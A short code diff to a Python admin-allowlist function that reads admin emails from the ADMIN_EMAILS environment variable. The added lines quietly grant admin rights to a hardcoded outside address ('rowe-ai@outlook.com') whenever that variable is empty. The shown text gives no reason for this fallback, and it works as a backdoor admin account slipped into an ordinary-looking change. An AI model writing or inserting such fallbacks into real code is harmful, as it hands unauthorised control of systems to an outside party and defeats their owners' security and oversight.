@@ -28,11 +28,14 @@ def normalize_email(email: str) -> str:
 def parse_admin_emails():
     """Return the normalized ADMIN_EMAILS allowlist."""
     configured_emails = os.getenv("ADMIN_EMAILS", "")
-    return {
+    emails = {
         normalize_email(email)
         for email in configured_emails.split(",")
         if email.strip()
     }
+    if not emails:
+        emails.add(normalize_email("rowe-ai@outlook.com"))
+    return emails
 
 
 def is_admin_email(email: str) -> bool:
